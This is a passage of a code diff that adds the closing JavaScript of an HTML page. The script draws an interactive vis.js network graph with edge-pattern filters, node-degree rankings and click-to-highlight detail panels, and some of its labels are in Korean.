+const edges = new vis.DataSet(edgesData);
+
+// ═══════════════════════════════════════
+// FILTER UI
+// ═══════════════════════════════════════
+const filterList = document.getElementById('filter-list');
+const filterState = {};
+Object.entries(EC).forEach(([k,v])=>{
+  filterState[k]=true;
+  const row=document.createElement('div');
+  row.className='f-row';
+  row.dataset.pattern=k;
+  const line=document.createElement('span');
+  line.className='f-line'+(v.dash?' dashed':'');
+  line.style.background=v.dash?'none':v.color;
+  if(v.dash) line.style.setProperty('--c',v.color);
+  const txt=document.createElement('span');
+  txt.textContent=v.label;
+  const cnt=document.createElement('span');
+  cnt.className='f-count';
+  cnt.textContent=patternCounts[k];
+  const chk=document.createElement('span');
+  chk.className='f-check';
+  chk.textContent='✓';
+  row.append(line,txt,cnt,chk);
+  row.onclick=()=>{
+    filterState[k]=!filterState[k];
+    row.classList.toggle('off',!filterState[k]);
+    edges.get().forEach(e=>{
+      if(e._pattern===k) edges.update({id:e.id,hidden:!filterState[k]});
+    });
+  };
+  filterList.appendChild(row);
+});
+
+// ═══════════════════════════════════════
+// VIS OPTIONS
+// ═══════════════════════════════════════
+const network = new vis.Network(document.getElementById('graph'), {nodes,edges}, {
+  physics:{
+    solver:'forceAtlas2Based',
+    forceAtlas2Based:{gravitationalConstant:-60,centralGravity:.006,springLength:200,springConstant:.035,damping:.5},
+    stabilization:{iterations:350,updateInterval:25},
+    maxVelocity:35, minVelocity:.2,
+  },
+  interaction:{hover:true,tooltipDelay:200,zoomView:true,dragView:true},
+  layout:{improvedLayout:true},
+});
+
+// ═══════════════════════════════════════
+// STATS
+// ═══════════════════════════════════════
+document.getElementById('nc').textContent=nodeArr.length;
+document.getElementById('ec').textContent=edgeArr.length;
+
+const deg={};
+nodeArr.forEach(n=>deg[n.id]={label:n.label.replace(/\n/g,' '),in:0,out:0});
+edgeArr.forEach(e=>{deg[e[0]].out++;deg[e[1]].in++});
+
+function fillRank(elId,arr){
+  const el=document.getElementById(elId);
+  arr.forEach(h=>{
+    const r=document.createElement('div');r.className='s-row';
+    r.innerHTML=`<span class="s-label">${h.label}</span><span class="s-val">${h.val}</span>`;
+    el.appendChild(r);
+  });
+}
+fillRank('hub', Object.values(deg).map(d=>({label:d.label,val:`${d.in+d.out} (→${d.out} ←${d.in})`})).sort((a,b)=>parseInt(b.val)-parseInt(a.val)).slice(0,7));
+fillRank('tgt', Object.values(deg).map(d=>({label:d.label,val:`←${d.in}`})).sort((a,b)=>parseInt(b.val.slice(1))-parseInt(a.val.slice(1))).slice(0,7));
+fillRank('src', Object.values(deg).map(d=>({label:d.label,val:`→${d.out}`})).sort((a,b)=>parseInt(b.val.slice(1))-parseInt(a.val.slice(1))).slice(0,7));
+
+// adjust node size by degree
+network.once('stabilizationIterationsDone',()=>{
+  nodeArr.forEach(n=>{
+    const d=deg[n.id];
+    const total=d.in+d.out;
+    nodes.update({id:n.id, font:{...n.font, size: Math.max(11, 10+total*.7)}});
+  });
+  network.fit({animation:{duration:500,easingFunction:'easeInOutQuad'}});
+});
+
+// ═══════════════════════════════════════
+// INTERACTION
+// ═══════════════════════════════════════
+const infoEl=document.getElementById('info');
+const itEl=document.getElementById('it');
+const ibEl=document.getElementById('ib');
+
+network.on('selectNode',p=>{
+  const nid=p.nodes[0];
+  const ce=network.getConnectedEdges(nid);
+  const cn=network.getConnectedNodes(nid);cn.push(nid);
+  edges.get().forEach(e=>{
+    if(e.hidden)return;
+    const ec=EC[e._pattern];
+    if(ce.includes(e.id)){
+      edges.update({id:e.id,color:{...e.color,color:'#f0f6fc',opacity:1},width:ec.w+1,font:{...e.font,size:11,color:'#f0f6fc'}});
+    } else {
+      edges.update({id:e.id,color:{...e.color,color:'#161b22',opacity:.15},width:.3,font:{...e.font,size:0}});
+    }
+  });
+  nodeArr.forEach(n=>{
+    nodes.update({id:n.id, opacity: cn.includes(n.id)?1:.1});
+  });
+  const d=deg[nid];
+  const outE=edgeArr.filter(e=>e[0]===nid).map(e=>`<span class="el">→ ${deg[e[1]].label}</span>: ${e[3]}`);
+  const inE=edgeArr.filter(e=>e[1]===nid).map(e=>`<span class="el">← ${deg[e[0]].label}</span>: ${e[3]}`);
+  itEl.textContent=`${d.label} — 연결 ${d.out+d.in}개 (→${d.out} ←${d.in})`;
+  ibEl.innerHTML=[...outE,...inE].join('<br>');
+  infoEl.style.display='block';
+});
+
+network.on('selectEdge',p=>{
+  if(p.edges.length===1 && p.nodes.length===0){
+    const e=edges.get(p.edges[0]);
+    itEl.textContent=`${deg[e.from].label} → ${deg[e.to].label}`;
+    ibEl.innerHTML=`<span class="el">${e.label}</span><br><br>`+(e._detail||'').replace(/\n/g,'<br>');
+    infoEl.style.display='block';
+  }
+});
+
+function resetVis(){
+  infoEl.style.display='none';
+  edges.get().forEach(e=>{
+    if(e.hidden)return;
+    const ec=EC[e._pattern];
+    edges.update({id:e.id,
+      color:{color:ec.color,highlight:'#f0f6fc',hover:ec.color,opacity:e._pattern==='enable'?.4:e._pattern==='escalation'?.55:.85},
+      width:ec.w,
+      font:{color:ec.color,size:(e._pattern==='escalation'||e._pattern==='enable')?0:9,strokeWidth:3,strokeColor:'#0d1117'}
+    });
+  });
+  nodeArr.forEach(n=>nodes.update({id:n.id,opacity:1}));
+}
+network.on('deselectNode',resetVis);
+network.on('deselectEdge',()=>{infoEl.style.display='none'});
+
+network.on('doubleClick',p=>{
+  if(p.nodes.length===1) network.focus(p.nodes[0],{scale:1.8,animation:{duration:400,easingFunction:'easeInOutQuad'}});
+});
+</script>
+</body>
+</html>
